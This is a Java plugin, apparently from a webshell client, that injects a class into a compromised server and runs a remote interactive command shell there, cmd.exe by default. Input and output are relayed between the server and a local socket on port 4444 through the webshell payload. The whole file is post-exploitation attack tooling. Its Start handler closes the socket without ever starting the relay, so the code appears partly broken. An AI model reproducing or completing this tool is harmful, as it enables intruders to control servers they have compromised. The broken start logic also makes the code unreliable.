package vip.youwe.shell.shells.plugins.java;

import vip.youwe.shell.core.Encoding;
import vip.youwe.shell.core.annotation.PluginnAnnotation;
import vip.youwe.shell.core.imp.Payload;
import vip.youwe.shell.core.imp.Plugin;
import vip.youwe.shell.core.shell.ShellEntity;
import vip.youwe.shell.core.ui.component.RTextArea;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.automaticBindClick;
import vip.youwe.shell.utils.functions;
import vip.youwe.shell.utils.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;

@PluginnAnnotation(payloadName = "JavaDynamicPayload", Name = "JRealCmd")
public class RealCmd implements Plugin {

    private static final String CLASS_NAME = "plugin.RealCmd";
    private JPanel panel;
    private RTextArea tipTextArea;
    private JButton StartButton;
    private JButton StopButton;
    private JLabel hostLabel;
    private JLabel portLabel;
    private JLabel pollingSleepLabel;
    private JLabel execFileLabel;
    private JTextField hostTextField;
    private JTextField portTextField;
    private JTextField execFileTextField;
    private JTextField pollingSleepTextField;
    private JSplitPane meterpreterSplitPane;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public RealCmd() {
        this.panel = new JPanel(new BorderLayout());
        this.pollingSleepLabel = new JLabel("延迟(ms)");
        this.execFileLabel = new JLabel("可执行文件路径");
        this.hostLabel = new JLabel("绑定本地Host :");
        this.portLabel = new JLabel("绑定本地Port :");
        this.StartButton = new JButton("Start");
        this.StopButton = new JButton("Stop");
        this.tipTextArea = new RTextArea();
        this.pollingSleepTextField = new JTextField("1000", 7);
        this.execFileTextField = new JTextField("cmd.exe", 30);
        this.hostTextField = new JTextField("127.0.0.1", 15);
        this.portTextField = new JTextField("4444", 7);
        this.meterpreterSplitPane = new JSplitPane();

        this.meterpreterSplitPane.setOrientation(0);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.pollingSleepLabel);
        meterpreterTopPanel.add(this.pollingSleepTextField);
        meterpreterTopPanel.add(this.execFileLabel);
        meterpreterTopPanel.add(this.execFileTextField);
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.StartButton);
        meterpreterTopPanel.add(this.StopButton);
        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));

        initTip();
        this.panel.add(this.meterpreterSplitPane);
    }

    private void StartButtonClick(ActionEvent actionEvent) {
        load();
        try {
            String host = this.hostTextField.getText().trim();
            String port = this.portTextField.getText().trim();
            ServerSocket serverSocket = new ServerSocket(Integer.parseInt(port), 1, InetAddress.getByName(host));
            serverSocket.close();
        } catch (Exception e) {
            Log.error(e);
            JOptionPane.showMessageDialog(getView(), e.getMessage(), "提示", 2);
        }
    }

    private void StopButtonClick(ActionEvent actionEvent) {
        load();
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("action", "stop");
        byte[] result = this.payload.evalFunc(CLASS_NAME, "xxx", reqParameter);
        if (result.length == 1 && (result[0] == 255 || result[0] == -1)) {
            JOptionPane.showMessageDialog(this.getView(), "stop ok", "提示", 1);
        } else {
            JOptionPane.showMessageDialog(this.getView(), "fail", "提示", 2);
        }
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/RealCmd.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success");
                } else {
                    Log.log("Load fail");
                }
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    private void initTip() {
    }

    public JPanel getView() {
        return this.panel;
    }

    class runCmd {
        JTextField pollingSleepTextField;
        Socket socketx;

        public runCmd(Socket socket, Payload payload, String execFile, JTextField pollingSleepTextField) {
            try {
                this.socketx = socket;
                this.pollingSleepTextField = pollingSleepTextField;
                OutputStream outputStream = socket.getOutputStream();
                InputStream inputStream = socket.getInputStream();
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("action", "start");
                reqParameter.add("execFile", execFile);
                byte[] result = payload.evalFunc(CLASS_NAME, "xxx", reqParameter);
                outputStream.write(result);

                (new Thread(new Runnable() {
                    public void run() {
                        RealCmd.runCmd.this.IO(inputStream);
                    }
                })).start();
                Thread.sleep(5000L);
                (new Thread(new Runnable() {
                    public void run() {
                        RealCmd.runCmd.this.LO(outputStream);
                    }
                })).start();
            } catch (Exception e) {
                Log.error(e);
                try {
                    this.socketx.close();
                } catch (IOException e1) {
                    Log.error(e);
                }
            }
        }

        public void IO(InputStream inputStream) {
            byte[] data = new byte[5120];
            try {
                int readNum;
                while ((readNum = inputStream.read(data)) != -1 && !this.socketx.isClosed()) {
                    ReqParameter reqParameter = new ReqParameter();
                    reqParameter.add("action", "processWriteData");
                    reqParameter.add("processWriteData", Arrays.copyOf(data, readNum));
                    byte[] result = RealCmd.this.payload.evalFunc(CLASS_NAME, "xxx", reqParameter);
                    if (result.length == 1 && result[0] == -1) {
                        this.socketx.close();
                        return;
                    }
                }
            } catch (Exception e) {
                try {
                    this.socketx.close();
                    return;
                } catch (IOException e1) {
                    Log.error(e);
                }
            }
        }

        public void LO(OutputStream outputStream) {
            try {
                while (!this.socketx.isClosed()) {
                    int sleepTime = Integer.parseInt(this.pollingSleepTextField.getText().trim());
                    Thread.sleep(((sleepTime > 500) ? sleepTime : 500));
                    ReqParameter reqParameter = new ReqParameter();
                    reqParameter.add("action", "getResult");
                    byte[] result = RealCmd.this.payload.evalFunc(CLASS_NAME, "xxx", reqParameter);
                    if (result.length == 1 && result[0] == -1) {
                        this.socketx.close();
                        return;
                    }
                    if (result.length != 2 || result[0] != 45 || result[1] != 49) {
                        outputStream.write(result);
                    }
                }

            } catch (Exception e) {
                try {
                    this.socketx.close();
                } catch (IOException e1) {
                    Log.error(e);
                }
            }
        }
    }

}
